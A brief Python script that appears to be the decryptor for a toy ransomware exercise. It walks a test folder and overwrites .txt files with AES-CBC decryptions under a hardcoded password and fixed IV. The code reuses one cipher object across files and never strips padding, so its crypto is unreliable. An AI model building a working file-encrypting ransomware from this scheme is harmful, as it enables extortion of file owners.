from Crypto.Cipher import AES
import hashlib
from queue import Queue 
import os

encrypted_ext = ('.txt',)

file_paths = []
for root, dir, files in os.walk('/root/Desktop/test'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'/'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'/'+file)

print(f"[*] files: {file_paths}")

#q = Queue()

#for file in file_paths:
	#q.put(file) 

#q.join()

password = b"fsocietyencryptingtheworld"
key = hashlib.sha256(password).digest()
IV = 'ThisisanIV456aaa'.encode()

cipher = AES.new(key,AES.MODE_CBC,IV)


#def pad_files(files):
	#while len(files) % 16 != 0:
	#	files = files + b"0"
	#return files

for file in file_paths:
	print(f'Decrypting {file}')
	with open(file, 'rb') as f:
		data = f.read()
		#padded_file = pad_files(data)
	with open(file, 'wb') as en:
		decrypted_data = cipher.decrypt(data)
		en.write(decrypted_data)
exit()




	#q.task_done()
		#print(decrypted_data)
		#padded_file = pad_files(data)
#mode = AES.MODE_CBC